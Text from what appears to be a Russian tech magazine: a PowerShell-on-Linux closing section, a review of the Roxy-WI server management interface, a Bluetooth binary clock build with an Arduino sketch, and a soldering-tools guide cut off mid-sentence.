Оболочка PowerShell  вполне  пригодна для  комфортного использования
в Linux, особенно если ты уже работал с ней в Windows, привык к объектной
природе этой оболочки, оценил ее возможности и особенности. В состав
PowerShell  входит  множество  стандартных  командлетов,  в  том  числе
для работы с файловой системой, структурированными данными (в форматах
CSV и JSON) и веб‑ресурсами по протоколу HTTP.
   Кроме внутренних командлетов, в оболочке можно выполнять любые кон‐
сольные утилиты, установленные в операционной системе. Поэтому получит‐
ся комбинировать возможности команд Linux с собственными механизмами
PowerShell (конвейерная обработка объектов, гибкая система форматиро‐
вания выводимой информации, обработка возникающих ошибок), а также
пользоваться всей функциональностью библиотек платформы .NET Core /
.NET 5 (например, для обработки символьной информации или работы
с датами и временем).
   Отдельного внимания заслуживают скрипты PowerShell. Для автомати‐
зации работы в Linux необязательно углубляться в дебри Bash-скриптинга
или  отказываться от удобств и простоты командного  языка, полностью
переходя на Python. Если ты уже писал скрипты PowerShell в Windows, то и в
Linux  сможешь  пользоваться  своими  наработками и  создавать новые
решения.
   Особых отличий в скриптах PowerShell для разных платформ нет, однако
интегрированная среда для  разработки PowerShell ISE доступна  только
в PowerShell для Windows, в состав PowerShell 6/7 она не входит. Для раз‐
работки скриптов в Linux Microsoft рекомендует использовать редактор Visual
Studio Code с расширением для поддержки языка PowerShell.


        WWW

                   В статье мы коснулись возможностей оболочки
                      и скриптов PowerShell очень кратко. Более под‐
                      робно эти вопросы рассматриваются в моей кни‐
                          ге «Современный PowerShell», вышедшей в мар‐
                         те 2022 года.
АДМИН

ROXY-WI

      УДОБНЫЙ ИНТЕРФЕЙС ДЛЯ
       HAPROXY, NGINX, APACHE И
              KEEPALIVED





                                      Даниил Батурин
                                         Координатор проекта VyOS
                                                      (https://vyos.io), «языковед»,
                                          функциональщик, иногда
                                             сетевой администратор
                                                       daniil@baturin.org





Apache HTTPD и Nginx — самые популярные серверы HTTP,
а HAProxy — один из самых востребованных балансиров‐
щиков нагрузки. Они прекрасно справляются со своими
задачами, и множество админов умеют с ними работать.
Однако настроить сервер мало — его еще нужно поддержи‐
вать, мониторить и масштабировать. Даже в пределах одно‐
го сервера это может быстро превратиться в утомительное
занятие. Тем более если управлять нужно кластером.


Решений для одного сервера достаточно много — «панели управления хос‐
тингом» существуют на любой вкус, и свободные, и проприетарные. Но одно‐
го сервера многим современным проектам уже не хватит. Чтобы справиться
с нагрузкой и обеспечить отказоустойчивость, нужен кластер.
   Радикальное решение для автоматизации управления кластером — под‐
ход infrastructure as code. Для самых крупных проектов это решение, веро‐
ятно, единственно возможное. Есть ли альтернативы для тех, кому уже нужна
автоматизация работы более чем с одним сервером? Проект Roxy-WI стре‐
мится создать такую альтернативу. Давай посмотрим, насколько ему это уда‐
ется.


ROXY-WI
Проект Roxy-WI стартовал в самом начале 2018 года. Он назывался HAProxy-
WI (HAProxy Web Interface), но позже сменил имя, поскольку его возможности
уже не ограничивались автоматизацией настройки HAProxy.
   Исходный код проекта распространяется по лицензии Apache 2.0, и его
можно найти на GitHub.
  Для финансирования разработки авторы Roxy-WI предоставляют платный
доступ к репозиториям с собранными пакетами, техническую поддержку
и дополнительные сервисы, например автоматическое резервное копиро‐
вание настроек.


УСТАНОВКА И ОБНОВЛЕНИЕ
Любой желающий может установить Roxy-WI из исходников, для этого дос‐
таточно клонировать репозиторий c GitHub и следовать инструкциям.
   Авторы Roxy-WI  предоставили нам пробный  доступ  к  репозиториям,
поэтому возиться с ручной установкой не пришлось. Установка из RPM
на Rocky Linux 8 (идейном наследнике CentOS) не составляет большого тру‐
да.
   Альтернативный вариант — развертывание на Amazon EC2 из официаль‐
ного образа. Образ устроен по принципу bring your own license — поль‐
зователь платит за ресурсы EC2, но не за использование ПО. В настоящий
момент в этом образе установлена версия 5.2.0, в то время как самая све‐
жая — 6.0.1.
  В интерфейсе Roxy-WI есть опция проверки и установки обновлений,
но нет опций настройки имени пользователя и пароля для доступа к репози‐
торию, так что настраивать их придется вручную, в /etc/yum.repos.d или в /
etc/apt/auth.conf.d.


ВНУТРЕННЯЯ СТРУКТУРА
Проект Roxy-WI написан на Python 3, так что прекращение поддержки Python
2.7 его никак не затронуло.
  Код и данные устанавливаются в каталог /var/www/haproxy-wi/app/ —
в невидимых для пользователя частях еще сохранилось старое имя проекта.
   Собственного  сервиса  у  интерфейса  Roxy-WI  нет,  он  полагается
на Apache HTTPD и генерирует конфиг в /etc/httpd/conf.d/roxy-wi.conf.
Веб‑приложение организовано весьма необычным для нашего времени спо‐
собом — в виде набора скриптов CGI. С одной стороны, процесс Roxy-WI
не может упасть, потому что каждый скрипт выполняется веб‑сервером
отдельно. С другой — все недостатки CGI остаются в силе: на запуск скрип‐
тов нужно время, и это отрицательно сказывается на отзывчивости интерфей‐
са.
  Для хранения данных Roxy-WI по умолчанию использует SQLite. Данные
о пользователях, серверах и прочих сущностях хранятся в файле /var/www/
haproxy-wi/app/roxy-wi.db. Вообще, все данные Roxy-WI хранит в катало‐
ге приложения: закрытые ключи для SSH в /var/www/haproxy-wi/keys/, кон‐
фиги серверов в /var/www/haproxy-wi/configs/ и так далее.
   Публичный доступ к этим каталогам запрещен только директивами Deny
from all в настройках Apache HTTPD, поэтому с настройками и путями нужно
быть внимательным, если вдруг захочется их поменять.
   Допускать  утечку файла roxy-wi.db категорически  нельзя,  поскольку
пароли пользователей в нем хранятся в виде хешей MD5 без использования
соли и уязвимы даже к простейшей атаке по радужным таблицам.
  С другой стороны, для резервного копирования или переноса установки
Roxy-WI на другой сервер достаточно заархивировать каталог /var/www/
haproxy-wi, что проще, чем если бы данные были разбросаны по множеству
каталогов. Но идеальным вариантом все равно представляется отдельный
каталог с данными, вроде /var/lib/roxy-wi, — хочется верить, что будущие
версии пойдут именно этим путем.
   Кроме SQLite, есть поддержка MySQL. Перейти с SQLite на MySQL можно
после установки. В веб‑интерфейсе опций для этой цели нет, придется пра‐
вить файл настроек /var/www/haproxy-wi/app/roxy-wi.cfg и инициали‐
зировать базу, запустив скрипт.


ВЕБ-ИНТЕРФЕЙС
В интерфейсе Roxy-WI можно найти ряд отличных идей. Например, если
какой‑то раздел настроек пуст, то пользователю показывают не просто пус‐
тую страницу, а страницу с видеоинструкцией о том, как использовать этот
раздел.





                     Пустая страница с видеоинструкцией

С другой стороны, в интерфейсе пока что много шероховатостей. К примеру,
поля для ввода адресов IP или доменных имен выдают неспецифичную ошиб‐
ку, если до или после адреса оказался пробел. Поле для ввода часового
пояса требует от пользователя строку для tzdata вроде Europe/Moscow —
ни  выпадающего  списка,  ни  автодополнения.  Ряд  полей,  например
ldap_enable, требуют от пользователя ввести 0 (disable) или 1 (enable), хотя
гораздо логичнее был бы чекбокс. Иными словами, пользоваться можно,
но простор для мелких улучшений большой.


ВОЗМОЖНОСТИ
Теперь давай глянем на собственно возможности работы с серверами. Заяв‐
ленный список весьма внушителен: Roxy-WI в той или иной степени способен
управлять настройками и HAProxy, и Apache HTTPD, и Nginx.
  Мы в деталях рассмотрим базовую функциональность, насколько позволя‐
ет объем статьи. Перед тем как что‑либо настраивать, нужно рассказать
Roxy-WI о серверах нашего кластера.


Взаимодействие с серверами
Взаимодействие с серверами происходит по SSH. Перед тем как добавлять
серверы, нужно загрузить закрытые ключи для подключения к ним. Диалог
добавления  пользователя и  ключа использует не слишком  интуитивную
и  стандартную  терминологию: поле name —  это имя набора  данных
для  аутентификации  (закрытого  ключа и  имени  пользователя), а поле
credential — имя пользователя, с которым Roxy-WI будет подключаться к сер‐
веру. Загрузить сам ключ можно только после создания записи для него.
Добавление ключей, конечно, не частая операция, но интерфейс опять же
можно улучшить.





                     Диалог добавления данных доступа





                           Диалог загрузки ключа

Добавление серверов не представляет никакой сложности. Разве что может
понадобиться обновить страницу вручную, чтобы увидеть добавленный сер‐
вер.





                     Диалог добавления данных доступа

Порадовала возможность сразу проверить подключение по SSH: чтобы убе‐
диться, что имя пользователя и ключ верные, достаточно нажать кнопку Check
рядом с полем Credentials.



                         Запись в списке серверов

Установить HAProxy на свежий сервер Roxy-WI может автоматически, что
сильно экономит время админу.
   Автоматическая установка Apache HTTPD в текущей версии не поддержи‐
вается — вероятно, она появится в будущих версиях. C Nginx у меня тоже воз‐
никла проблема — на Ubuntu 22 LTS он не установился — ни с «Докером»,
ни без.





                          Ошибка установки

Но добавление серверов, конечно, всего лишь вспомогательная функция.
Настоящие преимущества Roxy-WI видны в его подходе к работе с кон‐
фигами.


Работа с конфигами
Наиболее развито управление именно HAProxy, поскольку изначально проект
концентрировался на нем. Функции для работы с Nginx и Apache HTTPD
активно развиваются и пока уступают интерфейсу для HAProxy. Тем не менее
сама концепция управления конфигами явно показывает преимущества спе‐
циализации и в итоге вполне сможет составить конкуренцию решениям в духе
infrastructure as code.
   Конфиги HAProxy можно проверить на правильность перед отправкой
на сервер. Понятно, что это обертка для haproxy -c, но экономия времени
очевидна. Та же функция должна работать на Nginx (и быть аналогом nginx -
t), но у меня Roxy-WI пропустил конфиг с ошибками синтаксиса.
   Редактирование конфигов весьма продуманно. Веб‑редактор, конечно,
никогда не сравнится с Vim, Emacs или VSCode в деле редактирования тек‐
ста, но редактор Roxy-WI компенсирует это специализацией. К примеру,
в режиме просмотра можно показать или свернуть только определенные сек‐
ции конфига, а в режиме редактирования работает подсветка синтаксиса.
   Важная возможность — автоматическая репликация конфигов на резер‐
вный сервер и версионирование. В рамках подхода infrastructure as code
мы бы хранили конфиги или исходный материал для их создания в  Git
и занимались бы контролем версий сами. Roxy-WI делает это за нас: каждая
редакция конфига сохраняется внутри Roxy-WI и доступна для отката, прос‐
мотра и сравнения с другими редакциями. Хотя Roxy-WI не использует сис‐
тему контроля версий и хранит архивные конфиги в обычных файлах, он спо‐
собен показывать различия между версиями.
   Применение системы контроля версий сэкономило бы место на диске
и упростило бы поддержку описаний изменений — хочется увидеть это в
будущих версиях. В текущей версии поддерживается только периодическое
резервное копирование в удаленный репозиторий Git и только в версии
Enterprise.
   Кроме того, именно для HAProxy в Roxy-WI есть широкий набор генера‐
торов секций конфига.





                        Генераторы конфигов HAProxy

Отдельно  приятно  то, что перед  отправкой  сгенерированного  конфига
на сервер можно просмотреть его текст, — это выгодно отличает Roxy-WI
от проектов, где процесс для пользователя непрозрачен.


ДОПОЛНИТЕЛЬНЫЕ СЕРВИСЫ И ИНТЕГРАЦИИ
Тем пользователям, которые поддерживают проект финансово, доступны
не только собранные пакеты с самим Roxy-WI, но и ряд дополнительных сер‐
висов. Я уже упоминал сервис резервного копирования конфигов, но им все
не ограничивается. Другой полезный сервис — Roxy-WI Checker, который
помогает мониторить серверы и рассылать уведомления об инцидентах.
Разумеется, мониторинг и уведомление можно настроить и самому, благо
инструментов для этих целей огромное количество. Преимущество Roxy-WI
Checker — в интеграции с самим Roxy-WI. Ему автоматически становится
известно о серверах кластера и их сервисах, так что добавление серверов
в мониторинг перестает быть отдельной задачей. Сервис может автомати‐
чески отправлять уведомление в каналы Slack или Telegram, достаточно ука‐
зать токен для их API. Кроме того, уведомления о серверах из разных групп
можно отправлять в разные каналы, что полезно организациям с выделен‐
ными командами админов для разных частей проекта.


ПЛАНЫ НА БУДУЩЕЕ
Проект Roxy-WI не стоит на месте и постоянно развивается. Авторы планиру‐
ют в будущих версиях добавить новые возможности настройки отказоустой‐
чивости с помощью Keepalived, поддержку WAF (Web Application Firewall)
для Nginx, а также существенно улучшить работу с Apache HTTPD (например,
поддержку сбора статистики и резервного копирования конфигов). Обещают
исправить и недостатки интерфейса и в целом собираются его улучшить.


ЗАКЛЮЧЕНИЕ
Roxy-WI, безусловно, многообещающий проект. Задача настройки и управле‐
ния кластерами веб‑серверов — сложная и актуальная, и удачное решение
для ее автоматизации может сэкономить админам много времени и уберечь
их от ошибок. На данный момент Roxy-WI хорошо справляется с автомати‐
зацией  настройки  HAProxy  и  движется  в  сторону  полного  решения
для управления всеми компонентами кластера.
  Тем не менее Roxy-WI — помощник админа кластера, а не альтернатива
ему. Никакой инструмент не заменит собственные знания и опыт!
GEEK
ЧАСЫ
ДЛЯ ГИКА
2.0

ПРОЕКТИРУЕМ
И СОБИРАЕМ
НАСТОЛЬНЫЕ
БИНАРНЫЕ ЧАСЫ
С BLUETOOTH





                                                                           Jaw
                                                                                                   big-jaw@mail.ru





Есть множество способов определять время: по солнцу,
по часам на  компьютере, по запаху  обеда  у соседей.
Но пожалуй, самый хакерский — это бинарные часы. Вместо
обычного циферблата у них двоичный. Цифры зашифрованы
с помощью двух элементов — нуля и единицы, а для инди‐
кации можно использовать любой бинарный признак. В этой
статье я покажу, как самостоятельно  сделать бинарные
часы, которые будут стоять у тебя на столе и управляться
по Bluetooth.


По способу индикации времени бинарные часы разделяют на три группы.
   Первая — с двумя рядами диодов: часы и минуты.





                      Часы с двумя рядами светодиодов

Вторая — с тремя рядами диодов: часы, минуты, секунды.





                      Часы с тремя рядами светодиодов

Третья — с круговым расположением диодов.





                Часы с круговым расположением светодиодов

В каждом из вариантов время определяется по сумме горящих диодов,
а главное различие часов состоит в их внешнем виде. Способы подсчета
отличаются незначительно.
   Круговое  расположение диодов  копирует дизайн  стрелочных  часов.
На циферблате видно два круга светодиодов — внешний с маленькими кру‐
жочками и внутренний с большими. Крупные  круги соответствуют часам
и располагаются так же, как в обычных моделях: вверху двенадцать часов,
внизу — шесть, справа — три, слева — девять.
  В центре циферблата в ряд расположены еще четыре лампочки. С их
помощью можно определить единицы минут от одной до четырех. Для этого
нужно добавить значение пятиминутного интервала к значению горящего
диода в ряду.
   Часы с тремя рядами светодиодных огней — это ряды из двенадцати, пяти
и девяти диодов, над которыми расположен ряд чисел от одного до двенад‐
цати.
   Первая строка соответствует количеству часов, во второй отображаются
полные десятки минут, а в третьей — единицы минут. Каждый огонек соот‐
ветствует цифре, поэтому для определения времени достаточно сопоставить
значения всех трех строк.
   Часы с двумя строчками диодов — самая сложная из бинарных система
определения  времени. Она полностью  соответствует  своему  названию:
в ряду располагается от двух до четырех лампочек, каждая лампочка — двой‐
ка в определенной степени.
   Первый диод равен единице, второй — двум, третий — четырем, а чет‐
вертый — восьми. Во второй строке по такому же принципу расположены
числа 1, 2, 4, 8, 16 и 32.
   Чтобы определить время с помощью такой шкалы, необходимо сложить
цифры, соответствующие горящим диодам. Именно такие часы мы и будем
собирать сегодня.
   Подробнее о бинарных часах я писал в статье «Часы для гика. Подбираем
компоненты и мастерим бинарные часы». В комментариях меня спрашивали,
будет ли внедрение Bluetooth следующим шагом в доработке таких часов.
Почему бы и нет! Отличная задача для наших очумелых ручек.


СБОРКА НАЧИНКИ
Для сборки устройства я использовал:
 • модуль Bluetooth HC-05;
 • Arduino Pro mini;
 • модуль RTC DS32431;
 • магнитный кабель зарядки для смартфона;
 • адресную светодиодную ленту RGB WS2812 — 144 светодиода на метр;
 • несколько резисторов и соединительных проводов.

Собирать все буду навесным монтажом без использования общей печатной
платы, чтобы сэкономить время и деньги. Как ты уже мог догадаться, корпус
будет полностью напечатан на 3D-принтере.
  Для правильного соединения всех электронных модулей в общую электри‐
ческую цепь воспользуемся схемой.





            Принципиальная электрическая схема бинарных часов

И пройдемся по ее компонентам:
 • микроконтроллер — Arduino Pro mini, обозначен красным цветом;
 • U2 — модуль Bluetooth;
 • U1 — модуль RTC DS3231;
 • BT1 — батарейка для питания RTC-модуля во время, когда отключено
   основное питание (для сохранения и подсчета текущего времени);
 • с U3 по U38 — адресная светодиодная RGB-лента WS2812;
 • R1, R2, R3 — резисторы;
 • C1 — конденсатор;
 • +5V — шина с питанием схемы;
 • GND — земля.

Перед тем как запаять модуль Bluetooth в нашу схему, необходимо проверить
его на работоспособность. По желанию можно изменить его имя: для этого
нам понадобятся несколько AT-команд. Чтобы проверить связь с Bluetooth,
отправь тестовую команду AT: для этого введи текст AT и нажми Enter. Если
связь установлена корректно, то модуль ответит OK.
   После  этого можно  отправлять  остальные  AT-команды.  Настраивают
модуль в режиме программирования, отправляя AT-команды по последова‐
тельному порту.
   Подключим модуль HC-05 к плате Arduino по схеме ниже — контакт RX
подключаем к десятому пину на Arduino, соответственно, TX подключаем
на одиннадцатый контакт Arduino. На контакт KEY модуля подадим 3,3 В. AT-
команды будем отправлять из монитора последовательного порта Arduino
IDE.
   Загрузим в Arduino скетч из листинга, приведенного ниже. Для этого нам
понадобится библиотека SoftwareSerial. Скорость модуля UART в режиме
программирования — 9600 бод, но у тебя скорость передачи может отли‐
чаться, поэтому в случае неудачи следует подобрать другое значение.





                     Схема проверки Bluetooth-модуля


include <SoftwareSerial.h>


SoftwareSerial BTserial(10, 11); // Указываем пины RX и TX
соответственно


void setup()  {
  Serial.begin(9600);
  BTserial.begin(9600);
  Serial.println("start");
}


void loop() {
  if (BTserial.available()) {
    char c = BTserial.read(); // Читаем из Bluetooth-порта
    Serial.print(c); // Пишем в hardware-порт
  }
  if (Serial.available()) {
    char c = Serial.read(); // Читаем из hardware-порта
    BTserial.write(c); // Пишем в Bluetooth-порт
  }
}

Чтобы удобнее сопрягать часы со смартфоном, поменяем название модуля
Bluetooth со стандартного Bluetooth HC-05 на BinaryWatch. Для этого вос‐
пользуемся AT-командой (PDF).


AT + NAME = "BinaryWatch" \ r \ n — задает имя устройства как
BinaryWatch;
OK

Остальные AT-команды для настройки этого и аналогичных Bluetooth-модулей
приведены внизу статьи.
   Проверив модуль Bluetooth на работоспособность и изучив схему, мы
можем спаять компоненты наших часов. Когда все будет готово, заливаем
в Arduino прошивку с помощью Arduino IDE v1.8.19 и устанавливаем приложе‐
ние для управления в смартфон. Исходные коды прошивок и приложения я
приведу в конце статьи.
   Вот как это вышло у меня.





                           Тестовая сборка схемы

Я отрезал от светодиодной ленты 35 светодиодов, а после разрезал их
на две части: четырнадцать штук я буду использовать для индикации часов,
двадцать одну для подсветки минут. Светодиоды я вклеил в алюминиевый
профиль и заизолировал концы профиля, чтобы не было короткого замыка‐
ния.





                        Светодиодная лента WS2812





                       Светодиодная лента в профиле





                        Примерка профиля в световод

На этом работы с электронной частью закончены. Осталось только укоротить
провода, соединяющие все модули, и заизолировать их, чтобы они без проб‐
лем поместились в корпус.





                            Электроника в корпусе




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИGEEK
                    2.0  ЧАСЫ ДЛЯ ГИКА
           ПРОЕКТИРУЕМ И СОБИРАЕМ НАСТОЛЬНЫЕ
                   БИНАРНЫЕ ЧАСЫ С BLUETOOTH





СБОРКА КОРПУСА
Для моделирования корпуса часов я использовал САПР «Компас 3D».
  Все исходники 3D-моделей я оставлю в двух форматах: M3D — нативный
формат «Компаса», их ты сможешь редактировать и дорабатывать на свой
вкус, STL — готовые файлы для печати. Печатал я пластиком PLA, температу‐
ра экструдера и стола — 200 °C и 60 °C на 3D-принтере Anycubic Mega Zero
2.0. Заполнение деталей варьировал от 30 до 100%.
   Материалы, необходимые при сборке часов:
 • примерно 200 г пластика, я использовал PLA, но подойдет и любой другой;
 • шесть винтов с резьбой M4 длиной не менее 55 мм;
 • алюминиевый профиль для светодиодной ленты, отрезать по размерам
   светодиодов;
 • светорассеивающая пленка — ее можно вытащить из старой нерабо‐
  тающей матрицы ноутбука или монитора;
 • затемненный пластик я брал из полупрозрачного чехла телефона, можно
   заменить куском монолитного поликарбоната;
 • герметик для вклейки пластика в рамку часов;
 • магнитный кабель microUSB для  смартфона — будем  использовать
   для питания часов.

Теперь печать. В архиве ты найдешь восемь файлов, давай их рассмотрим.





                        Рамка экрана — Front01.m3d





                    Окантовка экрана — Ramka_01.m3d





                 Основная часть корпуса — Korpus01.m3d





                    Задняя крышка корпуса — Zad01.m3d





               Трафарет, экран для подсветки — Tablo_01.m3d





                      Световоды для минут и для часов





  Крепление для магнитного USB-коннектора вставляется в заднюю крыш‐
  ку корпуса

Чтобы вставить магнитный разъем microUSB в крепление в корпусе часов,
нужно аккуратно отпаять разъем microUSB от магнитной головки, подпаять
к нему два провода +5V и GND. А после подпаять их к собранной нами схеме.





                      Магнитный разъем microUSB





         Магнитный разъем после установки в корпус, вид снаружи





         Магнитный разъем после установки в корпус, вид изнутри

Теперь можно собирать корпус: в трафарет вставляем и защелкиваем све‐
товоды для минут и часов. Для лучшей светопроводимости их желательно заг‐
рунтовать и покрасить в белый матовый цвет изнутри. Скручиваем все части
корпуса винтами M4 в таком порядке:
 1. Рамка экрана.
 2. Трафарет, экран вместе со вставленными в него световодами.
 3. Основная часть корпуса.
 4. Вся электроника.
 5. Задняя крышка с магнитным разъемом.





         Трафарет со вставленными в него световодами, вид сверху





         Трафарет со вставленными в него световодами, вид снизу





                       Примеряю рамку экрана





           Наношу герметик на рамку экрана для вклейки стекла





                  Оставляю высыхать герметик на сутки





                           Рамка экрана в сборе

В рамку экрана на герметик или специализированный клей B7000 (или ана‐
логичный) вклеим полупрозрачный пластик вместе с рассеивающей пленкой.
Я достал его из чехла для телефона, но его можно и приобрести.
  И вот результат!





Я выложил для тебя готовое приложение, которое ты можешь установить
на свой смартфон. Оно написано на Delphi — с помощью Embarcadero RAD
Studio Delphi 10.4, исходные коды тоже в архиве.
  С помощью  этого приложения подключаем часы к смартфону через
Bluetooth и настраиваем подсветку на свой вкус.
  В приложении есть две вкладки — одна для настройки подключения
к  часам,  другая — для  настройки  времени и  управления  подсветкой
и режимами индикации.





                               Приложение





ВЫВОДЫ
Мы  спроектировали и собрали  уникальные  настольные бинарные часы
с управлением со смартфона через Bluetooth. В твоем распоряжении все
исходники: ты можешь повторить мой проект или создать свой на его основе.



        WWW

                         •Arduino Pro Mini
                          •Архив исходников
                        •Магнитный кабель microUSB
                           •Чехол, который я использовал
                         •Bluetooth HC-05
                        •Полный список AT-команд для Bluetooth HC-05
GEEK





    prostorosty
I'm just a TechnoFreak.
7753313vv@gmail.com



ВРЕМЯ
ПАЯТЬ!

ПОДБИРАЕМ ИНСТРУМЕНТЫ
И ОСВАИВАЕМ ИСКУССТВО ПАЙКИ




Уметь паять невероятно полезно: ты можешь самостоятель‐
но чинить электрические устройства или создавать собс‐
твенные. Наверняка в детстве ты держал в руках паяльник,
но если с тех пор так и не разобрался, как паять правильно,
то эта статья для тебя. В ней я расскажу о тонкостях пайки
медных   компонентов,  о  необходимом   оборудовании
и навыках. Сегодня ты поймешь, что пайка — это вовсе
не сложно!


Пайка — это способ соединения металлических элементов с помощью при‐
поя, сделанного из других металлов, с меньшей температурой плавления.
Этот способ используется во всех электрических устройствах. Если ты рас‐
потрошишь, например, калькулятор, внутри ты увидишь, что абсолютно все
электронные компоненты внутри него спаяны между собой. Это логично, ведь
соединение металлических элементов, одна из задач которых — проводить
ток, другим токопроводящим металлом будет гораздо эффективнее, чем
соединение, например, клеем.


ПАЯЛЬНИК ВСЕМУ ГОЛОВА
Начнем с главного инструмента — паяльника. Он нужен, чтобы нагревать при‐
пой до температуры плавления, если компоненты медные (а контакты элек‐
тронных компонентов, как правило, делаются именно из меди) — обычно
от 100 до 400 градусов. Паяльники бывают разные, начиная от старых совет‐
ских, без единой кнопки управления (воткнул в розетку и ждешь, пока наг‐
реется), и заканчивая навороченными паяльными станциями с экранами
и тумблерами, где есть еще и паяльный фен. Давай рассмотрим виды паяль‐
ников подробнее.


Паяльник с нихромовым нагревателем
В старом советском паяльнике находится нагреватель из нихромовой про‐
волоки, через который пропускается ток. Проволока намотана на не проводя‐
щий ток корпус, внутрь которого вставлено жало. В продвинутых версиях
такого паяльника есть регулировка температуры, что существенно облегчает
работу с припоями из металлов с разной температурой плавления, о которых
поговорим чуть позже.





                      Паяльник с нихромовым нагревателем

Стоят такие паяльники дешево, прибора за 500 рублей и мощностью 20 Вт
вполне хватит для нечастых и небольших работ (правда, толстые провода
паять таким паяльником будет нелегко). Подобные паяльники прочны и неп‐
рихотливы, но они долго нагреваются, и высокой производительности от них
ждать не стоит.


Паяльник с керамическим нагревателем
Внутри такого паяльника находится керамический стержень, который наг‐
ревается, когда к его контактам проводят напряжение. Такие паяльники наг‐
реваются гораздо быстрее, при должном уходе они долговечнее и обладают
более широким диапазоном для регулировки температуры и мощности.





                     Паяльник с керамическим нагревателем

Есть у такого паяльника и минусы — керамический нагреватель не прис‐
пособлен к физическим воздействиям, а жала для такого паяльника нужны
будут «родные». Про жала поговорим позже, а сейчас перейдем к следующе‐
му виду паяльников — индукционному.


Индукционный паяльник
Внутри него находится катушка индуктора. У наконечника такого паяльника
есть ферромагнитное покрытие, в нем катушка создает магнитное поле
с наведенными токами, от чего сердечник разогревается.





                  Индукционный паяльник и его устройство

При достижении определенной температуры (точки Кюри) ферромагнитное
покрытие теряет свои магнитные свойства и сердечник перестает нагревать‐
ся. Как только температура снижается, ферромагнитные свойства восстанав‐
ливаются и сердечник снова начинает нагреваться. В таком паяльнике тем‐
пература жала поддерживается автоматически без использования термодат‐
чика и управляющей электроники. Но из его принципа работы выходит глав‐
ный минус: для достижения разных температур нужны разные жала.


Газовый паяльник
Главное достоинство газового паяльника — его автономность. В таком
паяльнике тепло появляется за счет сгорания газа (заправляют из обычного
газового баллончика). Тонкую струйку огня создает специальная насадка,
без которой газовый паяльник превращается в горелку.





                             Газовый паяльник


Термовоздушная паяльная станция
Такой тип паяльников подает направленный поток горячего воздуха с регули‐
руемой температурой от 100 до 500 градусов.





                    Термовоздушная паяльная станция

В паяльных станциях обычно есть паяльник с керамическим нагревателем.
Лично мой выбор — именно такая станция. Паяльный фен (так называют тер‐
мовоздушный паяльник) очень полезен в быту. Например, распаивать мик‐
росхемы (если нам надо отделить спаянные элементы) гораздо удобнее
широким потоком горячего воздуха, чем тонким жалом обычного паяльника.
   Станции хорошего качества стоят в несколько раз дороже обычных паяль‐
ников, но, если ты паяешь часто, так же как и я, проще потратиться на нее и не
корячиться с простым паяльником.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИGEEK
      ВРЕМЯ ПАЯТЬ!

          ПОДБИРАЕМ ИНСТРУМЕНТЫ И ОСВАИВАЕМ
                            ИСКУССТВО ПАЙКИ





ПРИНАДЛЕЖНОСТИ ДЛЯ ПАЙКИ
Просто купив паяльник, нормально паять не получится, для комфортной
и правильной пайки потребуется набор из расходников и инструментов.
  В базовый набор входят припой, флюс или канифоль. С этим набором уже
можно работать, но неплохо будет докупить еще:
 • стриппер (инструмент для зачистки проводов от изоляции) или хотя бы
   бокорезы;
 • целлюлозную необгораемую губку для очистки жала паяльника;
 • набор термоусадок;
 • оплетку для удаления лишнего припоя;
 • пинцет или держатель с крокодильчиками, чтобы фиксировать спаиваемые
   детали;
 • подставку под паяльник (не будешь же ты все время держать паяльник
   в руке?);
 • оловоотсос.

Разберем весь комплект поподробнее.


Припой
Как правило, для припоя берут сплав свинца и олова. Это тонкая трубочка
с канифолью в  центре. Припой  плавится при  температуре, получаемой
от разогретого паяльника, и скрепляет токопроводящие элементы компонен‐
тов.





                                Припой

Припои  продаются  в  разных  упаковках  и  бывают  разных  диаметров.
Для начала я рекомендую приобрести оловянно‑свинцовый припой диамет‐
ром 1 мм.


Флюс и канифоль
Если попытаться сразу скрепить два зачищенных провода, капнув расплав‐
ленным припоем, провода скрепятся очень плохо. Дело в том, что металл,
из которого состоят контакты, входит в реакцию с кислородом из воздуха,
отчего на нем образуется оксидная пленка. Она и мешает правильному спа‐
иванию контактов. Бороться с оксидной пленкой помогают флюс и канифоль,
также они способствуют качественному распределению припоя. Канифоль —
это древесная смола, а флюс — ее раствор в спирте.





                           Канифоль и флюс

Я советую использовать флюс, потому что его расходуется меньше, чем
канифоли, и на жале остается гораздо меньше нагара. Мой выбор — флюс
ЛТИ-120. Это  спирто‑канифольный  флюс.  Спирт  помогает  растворять
оксидную  пленку и равномерно распределять канифоль по спаиваемой
поверхности. Он продается в удобных баночках с кисточкой и хорошо себя
зарекомендовал по характеристикам.


Стриппер





                                Стриппер

Стриппер — это инструмент для удобной зачистки концов паяемых проводов.
Зачищать контакты можно и обычными кусачками, но, чтобы освоить этот
навык, потребуется немало времени.


Губка
Тут все просто. Часть припоя, канифоли или флюса из‑за высокой температу‐
ры жала обгорает и остается на жале, а необгораемая целлюлозная губка
помогает его очищать.





                        Губка для очистки жала паяльника


Термоусадки
Термоусаживаемые трубки — это трубки разных диаметров из специального
пластика, которые резко сужаются до определенного размера при наг‐
ревании. Их используют для изоляции оголенных контактов как удобную
и надежную замену изоленте.





                           Набор термоусадок


Оплетка
Проволочная медная оплетка нужна для удаления лишнего припоя, в особен‐
ности с плоских контактов.





                              Катушка медной оплетки


Третья рука
Держать спаиваемые контакты в руках не только неудобно, но и небезопасно.
Металлические части нагреваются и могут оставить ожог. На помощь при‐
ходят «третьи руки» — держатели для компонентов.





                              Третья рука

У стандартных держателей обычно по две  ручки, а также имеется лупа
для увеличения. Мне двух ручек иногда не хватает, поэтому использую спе‐
циально напечатанный на 3D-принтере кастомный держатель аж с шестью
ручками,  небольшими  тисками, со  встроенными  подсветкой,  вытяжкой
и разъемом питания для коннекторов проводов.





                 Мой шестилапый держатель


Подставка
Несмотря на то что паять можно и без подставки, подставка под паяльник
просто необходима. Обычно она входит в комплект с паяльником. Подставки
могут различаться по внешнему виду, но исполняют одинаковые функции —
держат паяльник, пока ты не паяешь.





                            Подставки под паяльники


Оловоотсос
Еще один способ удалить лишний расплавленный припой — использовать
оловоотсос. Принцип работы этого инструмента (а это именно инструмент,
а не расходник, как оплетка) такой же, как у обычного шприца: в корпусе соз‐
дается разрежение воздуха, и за счет этого расплавленный припой всасыва‐
ется внутрь. Оловоотсос хорошо подходит для удаления припоя из отверстий.





                                 Оловоотсос


ЖАЛА
Отдельно поговорим о жалах. Для разных паяльников жала бывают разные.
Для классического паяльника с нихромовым нагревателем используются
медные стержневые жала, а для пальника с керамическим нагревателем —
съемные с никелевым покрытием. Они бывают разных форм и размеров, тон‐
кие и широкие, узкие и плоские. Для паяльников с медными жалами жала
